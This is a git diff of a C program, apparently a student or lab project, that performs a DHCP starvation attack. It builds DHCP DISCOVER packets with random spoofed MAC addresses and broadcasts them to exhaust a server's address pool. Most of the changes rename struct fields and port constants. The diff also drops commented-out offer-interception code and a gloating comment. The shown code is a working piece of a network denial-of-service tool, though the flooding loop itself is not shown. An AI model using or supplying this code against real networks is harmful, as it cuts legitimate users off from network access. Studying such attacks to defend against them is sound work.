@@ -43,23 +43,7 @@ int main(int argc, char *argv[])
 		printf("error socket\n");
 	};
 
-    
-
-	/*
-	//SEND DHCP DISCOVERY MESSAGE --> BROADCAST
-	if (dhcp_discover(sockfd) != 0) {
-		printf("ERROR : SEND DISCOVERY MESSAGE\n");
-	};
-	*/
-
-	/*
-	//WAIT FOR AN OFFER FROM THE DHCP AND INTERCEPT IT
-	if (receive_offer(sockfd) != 0) {
-		printf("ERROR : DHCP OFFER INTERCEPTION\n");
-	}; */
-
-	//HDCP STARVING --> SPAM (MWAHAHAHAA)
-
+	//
 
     //DHCP starvation start
 	send_packets(sockfd);
@@ -82,7 +66,7 @@ int create_socket() {
 
 	struct sockaddr_in src;
 	memset(&src, 0, sizeof(src));
-    src.sin_port = htons(CLIENT_PORT);
+    src.sin_port = htons(DHCP_CLIENT_PORT);
 	src.sin_family = AF_INET; // ipv4
 	src.sin_addr.s_addr = INADDR_ANY; //all interfaces to listen 0.0.0.0
 
@@ -124,17 +108,17 @@ int dhcp_discover(int sockfd) {
     // Operation code
     // 1 request
     // 2 reply
-	discovery_packet.dp_op = 1; 
+	discovery_packet.op = 1; 
     // hardware type
     // 1 ethernet
-	discovery_packet.dp_htype = 1;
+	discovery_packet.htype = 1;
     // mac len
-	discovery_packet.dp_hlen = 6;
+	discovery_packet.hlen = 6;
     //gateway hops
-	discovery_packet.dp_hops = 0;
+	discovery_packet.hops = 0;
     //transaction id, can be random
     // to match DISCOVER, OFFER, REQUEST, ACK
-	discovery_packet.dp_xid = htonl(rand()); 
+	discovery_packet.xid = htonl(rand()); 
 
     // does not matter much,
 	//discovery_packet.dp_secs = htons(0);
@@ -143,7 +127,7 @@ int dhcp_discover(int sockfd) {
     // https://datatracker.ietf.org/doc/html/rfc2131#section-4.1
     // first bit is the broadcast bit
     // 1000000000000000
-	discovery_packet.dp_flags = htons(32768);
+	discovery_packet.flags = htons(32768);
 
     /*
     Type
@@ -151,36 +135,36 @@ int dhcp_discover(int sockfd) {
     Value
     */
     // Magic cookie
-	discovery_packet.dp_options[0] = '\x63';
-	discovery_packet.dp_options[1] = '\x82';
-	discovery_packet.dp_options[2] = '\x53';
-	discovery_packet.dp_options[3] = '\x63';
+	discovery_packet.options[0] = '\x63';
+	discovery_packet.options[1] = '\x82';
+	discovery_packet.options[2] = '\x53';
+	discovery_packet.options[3] = '\x63';
 
 	// https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml
 
     // DHCP message type 
-	discovery_packet.dp_options[4] = 53;    
+	discovery_packet.options[4] = 53;    
     // option len in bytes
-	discovery_packet.dp_options[5] = '\x01';  
+	discovery_packet.options[5] = '\x01';  
     // message type in bytes
     // 1 dhcp discovery
-	discovery_packet.dp_options[6] = 1; 
+	discovery_packet.options[6] = 1; 
 									
 
 	//Random MAC for each packet
 
     // static AA for packets so i know which are mine
-	discovery_packet.dp_chaddr[0] = 0xAA;
-	discovery_packet.dp_chaddr[1] = 0xAA; 
+	discovery_packet.chaddr[0] = 0xAA;
+	discovery_packet.chaddr[1] = 0xAA; 
 	for (int i = 2; i < 6 ; i++) {
-		discovery_packet.dp_chaddr[i] = rand()%256; // 0-255 value
+		discovery_packet.chaddr[i] = rand()%256; // 0-255 value
 	};
 
     //Destination address 
 	struct sockaddr_in dest_broadcast; 
 	memset(&dest_broadcast,0,sizeof(dest_broadcast));
 	dest_broadcast.sin_family = AF_INET;
-	dest_broadcast.sin_port = htons(SERVER_PORT);
+	dest_broadcast.sin_port = htons(DHCP_SERVER_PORT);
 
     //255.255.255.255, no IP is given yet so broadcast
 	dest_broadcast.sin_addr.s_addr = INADDR_BROADCAST; 
@@ -211,7 +195,7 @@ int check_response(int sockfd) {
 		if (debug) print_packet(offer_packet);
 
 		//check if this is and offer
-		if (offer_packet.dp_options[4] != 53 || offer_packet.dp_options[6] != 2) {
+		if (offer_packet.options[4] != 53 || offer_packet.options[6] != 2) {
 			continue;
 		};
 
@@ -219,7 +203,7 @@ int check_response(int sockfd) {
         // check client MAC 
 		wrong_offer = 0;
 		for (int i = 0; i < 6; i++) {
-			if (offer_packet.dp_chaddr[i] != client_hardware_address[i]) {
+			if (offer_packet.chaddr[i] != client_hardware_address[i]) {
 				wrong_offer = 1;
 			};
 		};
@@ -253,39 +237,39 @@ void print_packet(const struct dhcp_packet packet){
     printf("DHCP PACKET\n");
 
     printf("Operation: ");
-    if(packet.dp_op == 1)
+    if(packet.op == 1)
         printf("REQUEST\n");
-    else if(packet.dp_op == 2)
+    else if(packet.op == 2)
         printf("REPLY\n");
     else
-        printf("????? (%d)\n", packet.dp_op);
-    printf("Hardware type: %d\n", packet.dp_htype);
-    printf("Hardware length: %d bytes\n", packet.dp_hlen);
+        printf("????? (%d)\n", packet.op);
+    printf("Hardware type: %d\n", packet.htype);
+    printf("Hardware length: %d bytes\n", packet.hlen);
     printf("Transaction ID: 0x%x\n",
-           ntohl(packet.dp_xid));
+           ntohl(packet.xid));
     printf("Flags: 0x%x\n",
-           ntohs(packet.dp_flags));
+           ntohs(packet.flags));
     printf("Client IP: %s\n",
-           inet_ntoa(packet.dp_ciaddr));
+           inet_ntoa(packet.ciaddr));
     printf("Assigned IP: %s\n",
-           inet_ntoa(packet.dp_yiaddr));
+           inet_ntoa(packet.yiaddr));
     printf("DHCP server IP: %s\n",
-           inet_ntoa(packet.dp_siaddr));
+           inet_ntoa(packet.siaddr));
 
 
     printf("Client MAC: ");
-    for(int i = 0; i < packet.dp_hlen; i++)
+    for(int i = 0; i < packet.hlen; i++)
     {
-        printf("%02X", packet.dp_chaddr[i]);
+        printf("%02X", packet.chaddr[i]);
 
-        if(i < packet.dp_hlen-1)
+        if(i < packet.hlen-1)
             printf(":");
     }
 
     printf("\n");
 
     printf("DHCP message type: ");
-    switch(packet.dp_options[6])
+    switch(packet.options[6])
     {
         case 1:
             printf("DISCOVER");
